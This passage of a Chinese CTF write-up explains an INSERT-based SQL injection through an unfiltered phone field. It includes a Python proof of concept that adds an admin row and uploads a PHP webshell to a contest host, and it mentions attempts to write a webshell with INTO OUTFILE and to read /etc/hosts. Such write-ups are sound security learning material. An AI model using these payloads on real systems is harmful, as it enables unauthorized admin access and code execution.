        if ($count > 15) {//test only 15 users
            http_response_code(403);
        }

    $sql = "INSERT INTO users (`role`, `username`, `password`, `phone`, `idcard`, `name`) VALUES('2','".addslashes($username)."', '".addslashes($password)."', '".$phone."', '".addslashes($idcard)."', '".addslashes($name)."')";
        $sql = str_replace(";","",$sql);
        $stmt = $dbh->prepare($sql);
    $stmt->execute();
    }
} else {
    header("Location: /login.php");
}
```

可以看到`INSERT`语句中对`username`,`password`等都做了过滤, 但是`$phone`参数却是原封不动的被插入进去了,但是这个`insert`注入, 只能执行15次,因为被插入数据的`user`表的数据不能超过15个,所以我们这个输入只能直接插入一个`role=0`的用户

最后在网上找了一段时间也没有太多`insert`语句的后续操作方式, 但是却被`;`的过滤这一点难住了(因为这里的语句是支持堆叠的,所以一开始藏尝试通过堆叠注入另起一个`insert`语句插入数据,但是`;`被滤了直接就断掉了我的思路), 之后就想着查看insert还有没有什么其他的拓展使用, 最后在官方手册找到的注入语句的方法(官方手册yyds)

##### 关于insert注入的一些特别的语句

> 使用示例一:**一般使用的都是这个**
> 
> ```mysql
> INSERT INTO tbl_name (col1,col2) VALUES(col2*2,15);
> ```
> 
> 使用示例二:
> 
> ```mysql
> INSERT INTO tbl_name (a,b,c)
>     VALUES ROW(1,2,3), ROW(4,5,6), ROW(7,8,9);
> ```
> 
> 使用示例三:
> 
> ```mysql
> INSERT INTO tbl_name (a,b,c) VALUES(1,2,3,4,5,6,7,8,9);
> ```
> 
> 使用示例四:
> 
> ```mysql
> INSERT INTO tbl_name (a,b,c)
>     VALUES(1,2,3), (4,5,6), (7,8,9);
> ```
> 
> 另外找到的一些用法示例:
> 
> <https://dev.mysql.com/doc/refman/8.0/en/insert-select.html> 第一个语句在这个题目中是可用的
> 
> ```sql
> INSERT INTO tbl_temp2 (fld_id)
>   SELECT tbl_temp1.fld_order_id
>   FROM tbl_temp1 WHERE tbl_temp1.fld_order_id > 100;
> 
> INSERT INTO ta TABLE tb;
> ```
> 
> <https://dev.mysql.com/doc/refman/8.0/en/insert-on-duplicate.html> 这里第一个语句在题目中可用
> 
> ```sql
> INSERT INTO t1 (a,b,c) VALUES (1,2,3)  ON DUPLICATE KEY UPDATE c=c+1;
> 
> UPDATE t1 SET c=c+1 WHERE a=1 OR b=2 LIMIT 1; 
> 
> INSERT INTO t1 (a,b,c) VALUES (1,2,3),(4,5,6)  ON DUPLICATE KEY UPDATE c=VALUES(a)+VALUES(b);
> 
> INSERT INTO t1 (a,b,c) VALUES (1,2,3),(4,5,6) AS new  ON DUPLICATE KEY UPDATE c = new.a+new.b;
> 
> INSERT INTO t1 (a,b,c) VALUES (1,2,3),(4,5,6) AS new(m,n,p)  ON DUPLICATE KEY UPDATE c = m+n;
> 
> INSERT INTO t1  SELECT c, c+d FROM t2  ON DUPLICATE KEY UPDATE b = VALUES(b);
> 
> INSERT INTO t1  SELECT * FROM (SELECT c, c+d AS e FROM t2) AS dt  ON DUPLICATE KEY UPDATE b = e;
> 
> INSERT INTO t1 SET a=1,b=2,c=3 AS new
>   ON DUPLICATE KEY UPDATE c = new.a+new.b;
> 
> INSERT INTO t1 SET a=1,b=2,c=3 AS new(m,n,p)
>   ON DUPLICATE KEY UPDATE c = m+n;
> 
> INSERT INTO t1 (a, b)
>   SELECT c, d FROM t2
>   UNION
>   SELECT e, f FROM t3
> ON DUPLICATE KEY UPDATE b = b + c;
> 
> INSERT INTO t1 (a, b)
> SELECT * FROM
>   (SELECT c, d FROM t2
>    UNION
>    SELECT e, f FROM t3) AS dt
> ON DUPLICATE KEY UPDATE b = b + c;
> ```
> 
> 更多....其他还有更多地语句并没有记录,我相信对于一位ctfer来说上面的应该是够用了的

这里我们可以使用`示例三`,`示例四`进行数据插入,为了看起来方便任意分别我使用了`示例四`的方式插入语句

最后整理一下需要满足的条件,构造出以下poc:

```python
import random

import requests
url="http://eci-2ze9vkawiglp5cwv0yob.cloudeci1.ichunqiu.com/"

session=requests.session()

def getrole0user():
    # 注册一个role=0的用户
    global session
    session.post(url + "register.php",
                 data="""{"name":"a","idcard":"123456789012345678","phone":"123','123','123'),('0','admin','123456','admin","username":"b","password":"a"}""",
                 headers={"content-type": "application/json"})
    # 登录这个role=0的用户并且将对应的session保留在当前这个对话中
    session.post(url + "login.php", data='{"username":"admin","passwd":"123456"}',
                 headers={"content-type": "application/json"})

def uploadwebshell(filename,text):
    global session
    # 注意用户名随机,要不然存在重名的数据段的话就会直接退出而导致执行上传文件失败
    data = {"submit1": random.random(), "username": random.random(), "info": random.random(), "name": random.random(),
            "worktime": random.random(), "special": random.random(), "position": random.random(),
            "password": random.random(), "idcard": random.random(), "phone": random.random()
            }
    # 上传文件
    print(session.post(url + "manage.php",
                       data=data,
                       files=[('file', (filename, text, 'image/png')),]
                       ).text
          )
    # 检查文件上传是否成功
    uploadurl = url + "img/" + filename
    print(uploadurl)
    print(session.post(uploadurl).text)

getrole0user()
filename = "shell.php"
text="""<? phpinfo();?><script language="php">phpinfo()</script><h1>aa</h1>"""
uploadwebshell(filename,text)

```

通过上面脚本可以完成文件上传,将文件上传到`img`目录下,但是应该是因为权限配置的原因, 这里的php文件并`不会被php解释器解析`,访问`/img/shell.php`的时候webshell代码会被直接输出, 所以就无法命令执行

因为`..`被滤了所以导致并不能目录穿越, 而我后面想尝试`.phtml`和`.htaccess`的时候发现都被`ht`这个过滤替换导致不可用, 到此我就别无它法了,不知道有没有大佬有别的想法

注: 另外我还想过尝试通过`select user() into outfile 'var/www/html/shell.php'`写入一个webshell或者通过`select load_file('/etc/hosts')`导出查看文件, 但是貌似都失败了,应该是默认的`secure_file_priv`权限配置并没有被修改的原因

蓝帽到这里就结束啦,完结撒花✿✿ヽ(°▽°)ノ✿~